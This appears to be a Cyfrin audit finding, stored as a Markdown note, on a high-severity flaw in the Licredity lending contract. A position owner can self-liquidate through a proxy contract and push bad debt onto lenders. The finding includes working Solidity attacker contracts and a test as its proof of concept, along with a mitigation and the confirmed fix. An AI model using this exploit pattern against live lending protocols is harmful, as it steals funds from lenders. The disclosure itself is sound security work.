---
tags:
  - lang/solidity
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - sector/lending
  - sector/nft
protocol: "[[Licredity]]"
auditors:
  - "[[immeas]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-09-01-cyfrin-licredity-v2.0.md"
genome:
  - "[[liquidation-logic]]"
  - "[[liquidation-manipulation]]"
  - "[[liquidation-underwater]]"
---
# Proxy-Based self-liquidation creates bad debt for lenders

- id: 62347
- impact: HIGH
- protocol: [[Licredity]]
- reporter: Immeas (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-09-01-cyfrin-licredity-v2.0.md

## Summary


The bug report describes a vulnerability in the Licredity contract that allows the owner of a position to exploit the system and profit at the expense of lenders. This can be done by using a separate contract to call the `seize` function, bypassing the check that prevents the owner from seizing their own position. This can be repeated to farm incentives and cause a loss for the protocol. A proof of concept is provided, along with a recommended mitigation to fix the issue. The bug has been fixed in the latest version of the contract.

## Details

**Description:** When calling [`Licredity::seize`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L550-L558) to liquidate an unhealthy position, the contract checks that the position owner is not the caller:

```solidity
// prevents owner from purposely causing a position to be underwater then profit from seizing it
// side effect is that positions cannot be seized by owner contract, such as non-fungible position manager, which is acceptable
if (position.owner == msg.sender) {
    assembly ("memory-safe") {
        mstore(0x00, 0x7c474390) // 'CannotSeizeOwnPosition()'
        revert(0x1c, 0x04)
    }
}
```

This check can be bypassed by calling `seize` through a separate contract. The position owner orchestrates the liquidation via a helper (“proxy”) contract so that `msg.sender` in `Licredity::seize` is the proxy, not the owner. Using `Licredity::unlock` and its callback, the attacker can open and under-collateralize a position and immediately self-liquidate it in the same transaction, socializing the loss to lenders.

**Impact:** The owner can liquidate their own under-collateralized position and capture the liquidator bonus, while pushing the shortfall onto lenders/the protocol. This can be performed atomically, repeated to farm incentives, and scaled up to available liquidity and configuration limits. No price movement is required, making it a practical drain of protocol value.

**Proof of Concept:** Add the following test to `LicreditySeize.t.sol`. It shows how an attacker can deploy an `AttackerRouter` and `AttackerSeizer` to open an unhealthy position and immediately self-liquidate it in the same `unlock` call:
```solidity
function test_seize_ownPosition_using_external_contract() public {
    /// open large position for existing lenders
    uint256 positionId = licredityRouter.open();
    token.mint(address(this), 10 ether);
    token.approve(address(licredityRouter), 10 ether);

    licredityRouter.depositFungible(positionId, Fungible.wrap(address(token)), 10 ether);

    uint128 borrowAmount = 9 ether;
    (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
    uint256 delta = borrowAmount.toShares(totalAssets, totalShares);

    licredityRouterHelper.addDebt(positionId, delta, address(1));

    // Attacker deploys router and helper contract to seize the position
    AttackerSeizer seizer = new AttackerSeizer(licredity);
    AttackerRouter attackerRouter = new AttackerRouter(licredity, token, seizer);

    // attack commences
    attackerRouter.depositFungible(0.5 ether);
}
```
And add these two contracts used:
```solidity
contract AttackerRouter {
    using StateLibrary for Licredity;
    using ShareMath for uint128;

    Licredity public licredity;
    BaseERC20Mock public token;
    AttackerSeizer public seizer;

    constructor(Licredity _licredity, BaseERC20Mock _token, AttackerSeizer _seizer) {
        licredity = _licredity;
        token = _token;
        seizer = _seizer;
    }

    function depositFungible(uint256 amount) external {
        // 1. add some collateral to the position
        //    so that it can become healthy after seize
        uint256 positionId = licredity.open();
        licredity.stageFungible(Fungible.wrap(address(token)));
        token.mint(address(licredity), amount);
        licredity.depositFungible(positionId);

        // 2. call unlock to take on debt and seize
        licredity.unlock(abi.encode(positionId));
        // 5. as `unlock` doesn't revert, the position has become healthy
    }

    function unlockCallback(bytes calldata data) public returns (bytes memory) {
        uint256 positionId = abi.decode(data, (uint256));

        // 3. increase debt share to make the position unhealthy
        uint128 borrowAmount = 1 ether;
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        uint256 delta = borrowAmount.toShares(totalAssets, totalShares);
        licredity.increaseDebtShare(positionId, delta, address(this));

        // 4. use the separate seizer contract to seize the position
        //    making it healthy again.
        seizer.seize(positionId);

        return new bytes(0);
    }
}

contract AttackerSeizer {
    Licredity public licredity;

    constructor(Licredity _licredity) {
        licredity = _licredity;
    }

    function seize(uint256 positionId) external {
        licredity.seize(positionId, msg.sender);
    }
}
```

**Recommended Mitigation:** In addition to enforcing `position.owner != msg.sender`, constrain `seize` so it must be the first operation in an `unlock` execution. As the `Locker` library already tracks if the position has been touched before, it can expose this to `seize`. And if the position has been touched, revert. This mirrors the approach used by Euler’s EVC/EVK combo to block atomic “create/borrow/self-liquidate” flows ([code](https://github.com/euler-xyz/euler-vault-kit/blob/master/src/EVault/modules/Liquidation.sol#L93-L95)).

**Licredity:** Fixed in [PR#57](https://github.com/Licredity/licredity-v1-core/pull/57/files), commit [`e9490bb`](https://github.com/Licredity/licredity-v1-core/commit/e9490bb3f82fdd829288a76af5d421c10570e6ba)

**Cyfrin:** Verified. `seize` now checks that there are no prior registrations of the same position in `Locker`.
